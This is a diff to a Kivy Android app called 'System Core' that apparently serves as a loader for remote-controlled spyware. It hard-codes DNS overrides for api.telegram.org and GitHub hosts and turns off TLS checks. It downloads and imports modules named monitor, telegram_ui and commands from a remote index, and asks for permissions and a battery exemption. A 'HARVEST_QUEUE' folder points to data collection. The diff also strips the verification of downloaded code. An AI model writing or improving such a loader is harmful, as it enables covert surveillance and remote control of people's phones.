@@ -9,7 +9,6 @@ import gc
 import time
 import socket
 import random
-import hashlib
 from datetime import datetime
 from kivy.app import App
 from kivy.uix.textinput import TextInput
@@ -21,7 +20,7 @@ from kivy.core.clipboard import Clipboard
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ========== 1. تجاوز DNS (Patch) ==========
+# ========== 1. تجاوز DNS (شامل api.telegram.org) ==========
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
@@ -30,12 +29,16 @@ def _patch_dns():
                 '185.199.108.133', '185.199.109.133',
                 '185.199.110.133', '185.199.111.133'
             ],
-            'cdn.jsdelivr.net': [
-                '151.101.2.229', '151.101.66.229', '151.101.130.229'
+            'api.telegram.org': [
+                '149.154.167.220', '149.154.167.221',
+                '149.154.167.99', '149.154.175.50'
             ],
             'zaen1993.github.io': [
                 '185.199.108.153', '185.199.109.153',
                 '185.199.110.153', '185.199.111.153'
+            ],
+            'cdn.jsdelivr.net': [
+                '151.101.2.229', '151.101.66.229', '151.101.130.229'
             ]
         }
         if host in override:
@@ -46,22 +49,21 @@ def _patch_dns():
 
 _patch_dns()
 
-# ========== 2. روابط index.json ==========
-INDEX_URLS = [
+# ========== 2. روابط index.json (مع إلغاء التخزين المؤقت) ==========
+INDEX_BASE_URLS = [
     "https://zaen1993.github.io/Android-Core/index.json",
-    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json",
-    "https://jsd.cdn.zzko.cn/gh/Zaen1993/Android-Core@main/index.json",
+    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
     "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
-    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
+    "https://raw.kkgithub.com/Zaen1993/Android-Core/main/index.json"
 ]
 
 HEADERS = {
     'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'Accept': 'application/json, text/plain, */*',
-    'Cache-Control': 'no-cache'
+    'Cache-Control': 'no-cache',
+    'Pragma': 'no-cache'
 }
 
-# ========== 3. المسارات والمجلدات ==========
+# ========== 3. المسارات الأساسية ==========
 def _get_path():
     try:
         from jnius import autoclass
@@ -83,7 +85,7 @@ os.makedirs(HARVEST_QUEUE, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
-# ========== 4. الأذونات ==========
+# ========== 4. الأذونات واستثناء البطارية ==========
 def _perms():
     try:
         from android.permissions import request_permissions, Permission
@@ -121,10 +123,10 @@ def _perms():
     except Exception as e:
         print(f"Battery exemption error: {e}")
 
-# ========== 5. تطبيق Kivy ==========
+# ========== 5. تطبيق Kivy الرئيسي ==========
 class CoreApp(App):
     def build(self):
-        self.title = "System Core v4.0"
+        self.title = "System Core v4.1"
         layout = BoxLayout(orientation='vertical', spacing=5)
 
         self.log = TextInput(
@@ -180,47 +182,17 @@ class CoreApp(App):
             return False
 
     def _download_safe(self, url, filename):
-        tmp_path = os.path.join(U, filename)
         final_path = os.path.join(R, filename)
-
-        candidates = [url]
-        if "raw.githubusercontent.com" in url:
-            candidates.append(url.replace("raw.githubusercontent.com", "cdn.jsdelivr.net/gh").replace("/refs/heads/main", "@main"))
-            candidates.append(url.replace("raw.githubusercontent.com", "raw.kkgithub.com"))
-
-        for attempt in range(3):
-            for current_url in candidates:
-                try:
-                    self._log(f"Downloading {filename} (attempt {attempt+1}) from {current_url.split('/')[2]}...")
-                    resp = requests.get(current_url, headers=HEADERS, timeout=20, verify=False, stream=True)
-                    if resp.status_code == 200:
-                        content_chunks = []
-                        total_len = 0
-                        for chunk in resp.iter_content(chunk_size=8192):
-                            if chunk:
-                                content_chunks.append(chunk.decode('utf-8', errors='ignore'))
-                                total_len += len(chunk)
-                                if total_len > 5_000_000:
-                                    self._log(f"File too large (>5MB), aborting.", "WARN")
-                                    break
-                        content = "".join(content_chunks)
-                        if len(content) > 200:
-                            with open(tmp_path, 'w', encoding='utf-8') as f:
-                                f.write(content)
-                            if self._verify_module(tmp_path, filename):
-                                with open(tmp_path, 'r', encoding='utf-8') as src:
-                                    content = src.read()
-                                with open(final_path, 'w', encoding='utf-8') as dst:
-                                    dst.write(content)
-                                self._log(f"✅ {filename} downloaded successfully")
-                                return True
-                            else:
-                                self._log(f"❌ {filename} failed verification", "ERROR")
-                                return False
-                except Exception as e:
-                    self._log(f"Error from {current_url}: {e}", "WARN")
-            time.sleep(3)
-        self._log(f"❌ {filename} failed after all attempts", "ERROR")
+        # إضافة معامل زمني لتجاوز الكاش (cache‑busting)
+        url_with_cache_buster = f"{url}?t={int(time.time())}"
+        try:
+            resp = requests.get(url_with_cache_buster, headers=HEADERS, timeout=20, verify=False)
+            if resp.status_code == 200 and len(resp.content) > 200:
+                with open(final_path, 'wb') as f:
+                    f.write(resp.content)
+                return True
+        except Exception as e:
+            self._log(f"Download error for {filename}: {e}", "WARN")
         return False
 
     def _start(self, _):
@@ -230,16 +202,17 @@ class CoreApp(App):
         _perms()
         self._log("🚀 Ultra Secure Core (Anti-Block Mode) starting...", "BOOT")
 
-        # --- 1. جلب index.json ---
+        # --- 1. جلب index.json (مع منع التخزين المؤقت) ---
         all_files = []
-        for idx_url in INDEX_URLS:
+        for base_url in INDEX_BASE_URLS:
             try:
-                self._log(f"Trying index: {idx_url.split('/')[2]}...")
-                resp = requests.get(idx_url, headers=HEADERS, timeout=15, verify=False)
+                url = f"{base_url}?t={int(time.time())}"
+                self._log(f"Trying index: {url.split('/')[2]}...")
+                resp = requests.get(url, headers=HEADERS, timeout=15, verify=False)
                 if resp.status_code == 200:
                     data = resp.json()
                     all_files = data.get('files', [])
-                    self._log(f"📄 Found {len(all_files)} files from {idx_url.split('/')[2]}")
+                    self._log(f"📄 Found {len(all_files)} files from {base_url.split('/')[2]}")
                     break
                 else:
                     self._log(f"Index returned HTTP {resp.status_code}", "WARN")
@@ -248,7 +221,7 @@ class CoreApp(App):
         else:
             self._log("⚠️ Could not fetch index.json. Using cached files if any.", "WARN")
 
-        # --- 2. تحميل الملفات ---
+        # --- 2. تحميل الملفات (باستثناء main.py) ---
         for file_url in all_files:
             filename = file_url.split('/')[-1]
             if filename == "main.py":
@@ -257,7 +230,7 @@ class CoreApp(App):
 
         time.sleep(1)
 
-        # --- 3. تنظيف الموديولات القديمة ---
+        # --- 3. تنظيف الموديولات القديمة من الذاكرة ---
         self._log("🧹 Cleaning memory...")
         modules_to_remove = [
             "monitor", "telegram_ui", "commands",
@@ -267,10 +240,16 @@ class CoreApp(App):
         for mod in modules_to_remove:
             if mod in sys.modules:
                 del sys.modules[mod]
+        # إعادة تحميل الموديولات بعد مسح الكاش
         importlib.invalidate_caches()
         gc.collect()
 
         # --- 4. تحميل الأسرار من config.py ---
+        telegram_path = os.path.join(R, "telegram_ui.py")
+        if not os.path.exists(telegram_path):
+            self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
+            return
+
         try:
             import config
             importlib.reload(config)
@@ -280,13 +259,7 @@ class CoreApp(App):
             self._log(f"❌ Failed to load config: {e}", "ERROR")
             return
 
-        # --- 5. التأكد من وجود telegram_ui.py ---
-        telegram_path = os.path.join(R, "telegram_ui.py")
-        if not os.path.exists(telegram_path):
-            self._log("❌ telegram_ui.py not found. Please check internet connection and retry.", "ERROR")
-            return
-
-        # --- 6. إقلاع النظام ---
+        # --- 5. إقلاع النظام الأساسي ---
         try:
             import monitor
             import telegram_ui
